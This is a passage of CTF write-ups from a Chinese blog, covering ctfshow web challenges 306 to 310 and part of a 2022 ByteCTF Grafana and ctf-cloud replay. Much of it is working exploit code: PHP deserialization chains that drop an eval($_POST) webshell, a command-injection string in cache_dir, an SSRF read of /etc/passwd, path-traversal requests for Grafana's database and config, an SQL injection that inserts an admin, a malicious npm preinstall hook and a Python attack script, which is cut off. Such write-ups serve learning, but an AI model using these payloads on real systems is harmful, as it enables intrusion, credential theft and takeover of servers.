style="zoom: 67%;" /></p><p>成功写入木马</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221021150807325.png" alt="image-20221021150807325" style="zoom: 67%;" /></p><p>随后，使用蚁剑连接数据库</p><p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20221021152146482.png" alt="image-20221021152146482" style="zoom: 50%;" /></p><p>成功找到flag，结束。</p><h2 id="web306反序列化">6、Web306（反序列化）</h2><p>这题上来先是MVC的结果</p><p>View --&gt; Service --&gt; Data</p><p>我们首先查看<code>class.php</code>，发现了<code>log</code>类，看起来可以写入木马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">log</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>=<span class="hljs-string">&#x27;log.txt&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$info</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loginfo</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;info=<span class="hljs-keyword">$this</span>-&gt;info.<span class="hljs-variable">$info</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;<br>file_put_contents(<span class="hljs-keyword">$this</span>-&gt;title, <span class="hljs-keyword">$this</span>-&gt;info);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么就是反序列化和找到<code>close</code>函数的利用点了。</p><p>首先是<code>close</code>，全局搜索一下，发现<code>dao</code>类在销毁的时候，会调用子类的<code>close</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><span class="hljs-comment"># 这是我在本地添加的方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;conn = <span class="hljs-variable">$var</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;conn-&gt;close();<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>那么接下来就是反序列化的触发点，在<code>login.php</code>和<code>index.php</code>都发现了触发点。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221021165105925.png" alt="image-20221021165105925" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20221021165202791.png" alt="image-20221021165202791" style="zoom: 55%;" /></p><p>这样的情况，我们得看文件包含的情况，很显然<code>login.php</code>没有导入<code>dao.php</code>，是找不到对应类的，因此我们选择后者作为反序列化的注入点。</p><p>攻击链为</p><p><code>index.php</code>触发反序列化 <span class="math inline">\(\rightarrow\)</span> 反序列化<code>dao</code>（<code>dao.conn</code>=<code>log</code>）<span class="math inline">\(\rightarrow\)</span><code>dao</code>销毁<span class="math inline">\(\rightarrow\)</span> 触发<code>conn.close()</code></p><p><code>exp.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;dao.php&quot;</span>;<br>    <br>    <span class="hljs-variable">$c_log</span> =  <span class="hljs-keyword">new</span> log();<br>    <span class="hljs-variable">$c_log</span>-&gt;title = <span class="hljs-string">&quot;1.php&quot;</span>;<br>    <span class="hljs-variable">$c_log</span>-&gt;info = <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]); highlight_file(__FILE__);?&gt;&#x27;</span>; <br><br>    <span class="hljs-variable">$c_dao</span> = <span class="hljs-keyword">new</span> dao();<br>    <span class="hljs-variable">$c_dao</span>-&gt;set(<span class="hljs-variable">$c_log</span>);<br><br>    <span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-variable">$c_dao</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将最后的结果作为Cookie加入请求报文，成功拿到shell，flag在flag.php中。</p><h2 id="web307反序列化">7、Web307（反序列化）</h2><p>这道题引入了MVC框架，但是路由的访问仍然是通过文件路由的形式。</p><p>继续探测是否存在反序列化漏洞，这次<code>log</code>修改了同名函数，这样也就无法利用<code>close</code>函数。</p><p>但是这次在<code>dao</code>类中出现了新的函数<code>clearCache</code>，看这个样子我们可以利用管道来实现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">clearCache</span>(<span class="hljs-params"></span>)</span>&#123;<br>shell_exec(<span class="hljs-string">&#x27;rm -rf ./&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;config-&gt;cache_dir.<span class="hljs-string">&#x27;/*&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看该函数的引用，发现在<code>service</code>类中通过<code>dao</code>调用了<code>clearCache</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearCache</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;dao-&gt;clearCache();<br>&#125;<br></code></pre></td></tr></table></figure><p>继续搜索引用，发现在<code>logout.php</code>中发现了该函数的引用，同时也发现了反序列化的入口。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    session_start();<br>    error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;service/service.php&#x27;</span>;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;error&#x27;</span>]);<br>    setcookie(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-variable">$service</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;service&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$service</span>)&#123;<br>        <span class="hljs-variable">$service</span>-&gt;clearCache();<br>    &#125;<br>    setcookie(<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    setcookie(<span class="hljs-string">&#x27;service&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    header(<span class="hljs-string">&quot;location:../login.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这时候，不完全的MVC框架的问题就出现了，由于仍然使用文件路由的形式，我们可以直接访问<code>logout.php</code></p><p>那么分析得到第一条攻击链</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">logout.php触发-&gt; <br>反序列化service<span class="hljs-function"><span class="hljs-params">(__wakeup 绕过？)</span>-&gt;</span> <br>service.clearCache<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span> <br>dao.clearCache() 管道绕过rce<br></code></pre></td></tr></table></figure><p>但是由于<code>service</code>存在<code>__wake</code>魔术方法，由于PHP为7.3，因此也没有办法利用属性数量不匹配的问题绕过<code>__wakeup</code>。</p><p>重新分析上述的攻击链，我们发现反序列化<code>service</code>类完全没有必要，我们可以直接反序列化<code>dao</code>类来实现。</p><p>就此，我们构造出了<code>exp.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-17 15:03:23</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-18 01:55:22</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;config/config.php&#x27;</span>;<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;config = <span class="hljs-keyword">new</span> config();<br><span class="hljs-keyword">$this</span>-&gt;config-&gt;cache_dir = <span class="hljs-string">&quot;cache/* &amp; echo &#x27;&lt;?php eval(\$_POST[a]); ?&gt;&#x27; &gt; 1.php &amp; sleep 2 &amp; rm rf ./cache&quot;</span>;<br><span class="hljs-keyword">$this</span>-&gt;init();<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;conn=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-keyword">$this</span>-&gt;config-&gt;get_mysql_host(),<span class="hljs-keyword">$this</span>-&gt;config-&gt;get_mysql_username(),<span class="hljs-keyword">$this</span>-&gt;config-&gt;get_mysql_password(),<span class="hljs-keyword">$this</span>-&gt;config-&gt;get_mysql_db());<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">clearCache</span>(<span class="hljs-params"></span>)</span>&#123;<br>shell_exec(<span class="hljs-string">&#x27;rm -rf ./&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;config-&gt;cache_dir.<span class="hljs-string">&#x27;/*&#x27;</span>);<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> dao();<br><span class="hljs-variable">$var</span>-&gt;set();<br><span class="hljs-keyword">echo</span> urlencode(base64_encode((serialize(<span class="hljs-variable">$var</span>))));<br></code></pre></td></tr></table></figure><p>这里我构造的payload能够实现写木马的功能。</p><p>写入之后，顺利地在<code>/controller/1.php</code>的路由下拿到木马。</p><h2 id="web308ssrf实现rce">8、Web308（SSRF实现RCE）</h2><p>这题相比上一题，对于cache_dir的检查限制到了仅限字母，那么就很难再次利用。</p><p>经过审计之后，发现增加了SSRF利用点</p><p>在fun.php 下存在方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkUpdate</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br><span class="hljs-variable">$ch</span>=curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-literal">false</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-literal">true</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>); <br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$res</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有做任何限制，看看是否能够利用，发现该方法在<code>dao</code>类中被利用，并在index.php中反序列化实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><span class="hljs-comment">// ....</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVersion</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> checkUpdate(<span class="hljs-keyword">$this</span>-&gt;config-&gt;update_url);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这就使得我们可以构造反序列化链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">index</span>.php 反序列化 -&gt;</span><br><span class="hljs-function"><span class="hljs-title">dao</span> 类反序列化 -&gt;</span><br>调用<span class="hljs-function"><span class="hljs-title">checkVersion</span>方法 -&gt;</span><br>实现SSRF<br></code></pre></td></tr></table></figure><p>由此可以构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;./controller/service/dao/config/config.php&quot;</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dao</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;config=<span class="hljs-keyword">new</span> config();<br>            <span class="hljs-keyword">$this</span>-&gt;config-&gt;update_url = <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>;<br>        &#125;<br>    &#125;;<br><br>    <span class="hljs-variable">$payload</span> = urlencode(base64_encode(serialize(<span class="hljs-keyword">new</span> dao())));<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>将生成的内容填充至Cookie中，能够成功读取到<code>/etc/passwd</code>的内容。</p><p>但是此处并不支持<code>dict://127.0.0.1:3306/info</code>等协议的直接查看，也没办法通过路径猜出<code>flag</code>文件在哪。</p><p>这时候要是用gopher协议实现SSRF RCE，具体方法可以见SSRF篇章，此处不再详述。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0026/image-20230331215108683.png" alt="image-20230331215108683" /></p><h2 id="web309ssrf打fastcgi">9、Web309（SSRF打Fastcgi）</h2><p>利用SSRF信息收集，通过查看nginx配置文件发现存在fastcgi，于是用gopher协议打fastcgi。</p><p>最后拿到flag</p><p>这里使用的语句最好使用shell编码，否则$_会被当成shell变量。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230403162935085.png" alt="image-20230403162935085" /></p><h2 id="web310ssrf内网站点">10、Web310（SSRF内网站点）</h2><p>这道题的漏洞入口点还是Web308的漏洞入口，因此具体分析就不再说明了。</p><p>这里应该是SSRF做一个信息收集</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>services<br><span class="hljs-regexp">/etc/</span>hosts<br><span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/nginx/</span>conf<br></code></pre></td></tr></table></figure><p>查看nginx配置文件发现内网4476端口存在flag，直接读取即可。</p><p>完结撒花！</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>audit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022ByteCTF复现</title>
    <link href="/2022/09/29/blog0025-2022ByteCTF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/09/29/blog0025-2022ByteCTF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>周末和队友一起打了ByteCTF，就打了第一天，第二天睡大觉去了。</p><p>字节出的题还是学到了非常多的，现在复盘一下。</p><p>这次比赛的好多知识点之前在挖洞/刷题都见过，可惜当时没能深挖，还是缺乏研究的时间啊。<br /><span id="more"></span><br />## web</p><h3 id="grafana">grafana</h3><h4 id="解题复盘">解题复盘</h4><p>这题是一个经典的框架题，grafana是一个可视化的web应用，打开页面发现是一个注册框。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929231352356.png" alt="image-20220929231352356" style="zoom:50%;" /></p><p>重点是底下的信息，尤其是版本，尝试搜索一下，发现该版本存在任意文件读取漏洞。</p><p>尤其是该漏洞不需要登录权限，基本上可以猜测需要利用这个CVE读取配置文件，从而实现登录。</p><p>https://github.com/jas502n/Grafana-CVE-2021-43798</p><p>https://xz.aliyun.com/t/10647</p><p>重点是读取grafana.db和grafana.ini读取到密文以及密钥，从而解密密码。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">GET <span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/text/</span>#<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>var<span class="hljs-regexp">/lib/g</span>rafana/grafana.db<br>GET <span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/text/</span>#<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/grafana/g</span>rafana.ini<br></code></pre></td></tr></table></figure><p>需要注意的是，这里要绕过nginx反向代理，使用#来绕过。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/image-20220929232549876.png" alt="image-20220929232549876" style="zoom:50%;" /></p><p>获取到这两个文件后，直接利用github上的现成exp解决。</p><h4 id="我的总结">我的总结</h4><p>这道题的解题思路是比较简单的，网上有非常多关于CVE-2021-43798的博客，我的问题在于没能及时解决Nginx反向代理的问题，从而卡在了400报错，之前在渗透测试的时候就遇到了类似的问题，当时没有深究，比赛的时候就麻爪了。</p><p>同时GitHub上的脚本也非常多，以后面对这种CVE，可以多看看Github上的exp，往往出题人就是对着这些exp的攻击思路来出题的。</p><h3 id="ctf-cloud">ctf-cloud</h3><h4 id="解题复盘-1">解题复盘</h4><p>这题两个点，首先是获取admin权限，其次是利用preinstll的特性来实现文件读取。</p><p>首先审计源代码，查看<code>routers/user.js</code></p><p>注入点直接拼接了字符串而不是用占位符预编译，因此我们构造如下payload</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;123&#x27;,<span class="hljs-number">0</span>),(&#x27;admin&#x27;,&#x27;<span class="hljs-number">123456</span>&#x27;,<span class="hljs-number">1</span>);<span class="hljs-meta">#-- -</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0024/1.png" alt="1" style="zoom: 50%;" /></p><p>获取了admin的权限，进入工作页面。</p><p>首先构造带有漏洞的包（这里的上传路径我们是不知道的，可以先上传一个文件看看）。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;myapp&quot;</span>,<br>    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.0.0&quot;</span>,<br>    <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;exp&quot;</span>,<br>    <span class="hljs-attr">&quot;scripts&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;preinstall&quot;</span>: <span class="hljs-string">&quot;cat /flag &gt; /usr/local/app/public/app/public/uploads/c.txt&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将对应的文件夹压缩为.tar格式（也可以使用git远程加载）</p><p>上传.tar文件包，需要注意的是，它原生的上传接口写得有问题，没办法传送文件，建议使用Python编程来实现。</p><p>上传dependencies的json，直接也使用Python编程一把过了。</p><p>最后点击编译，读取上传目录下的文件就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;https://fadd264b400e679694169cd6ba0dff77.2022.capturetheflag.fun&quot;</span><br><br>route0 = <span class="hljs-string">&quot;/dashboard/reset&quot;</span><br>route1 = <span class="hljs-string">&quot;/dashboard/upload&quot;</span><br>route2 = <span class="hljs-string">&quot;/dashboard/dependencies&quot;</span><br>route3 = <span class="hljs-string">&quot;/dashboard/run&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>&#125;<br><br>data=&#123;<br>    <span class="hljs-string">&#x27;dependencies&#x27;</span> : &#123;<br>        <span class="hljs-string">&#x27;babel-core&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1/app/public/uploads/exp.tar&#x27;</span>,<br>    &#125;,<br>&#125;<br><br>cookies = &#123;<br>    <span class="hljs-string">&quot;connect.sid&quot;</span>:<span class="hljs-string">&quot;s%3A6O6RbUoJbSPHrrxssAh-eRrSAm6aFmY7.QDzxD%2BlygrhUNDBJCh1Ckx%2FHVFIToHwb%2BPAR6LrCcj0&quot;</span><br>&#125;<br><br><span class="hljs-comment"># rest package and dependencies</span><br>response = requests.post(url=url+route0, <br>                        cookies=cookies,<br>                        verify=<span class="hljs-literal">False</span>,<br>                        proxies=&#123;<br>                            <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>                        &#125;)<br><br><span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-comment"># upload package</span><br>response = requests.post(url=url+route1, <br>                        cookies=cookies,<br>                        files=&#123;<br>                            <span class="hljs-string">&quot;exp.tar&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.tar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>                        &#125;, <br>                        verify=<span class="hljs-literal">False</span>,<br>                        proxies=&#123;<br>                            <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>                        &#125;)<br><br><span class="hljs-built_in">print</span>(response.text)<br><br><span class="hljs-comment"># upload dependencies</span><br>response = requests.post(url=url+route2,<br>                        headers = headers,<br>                     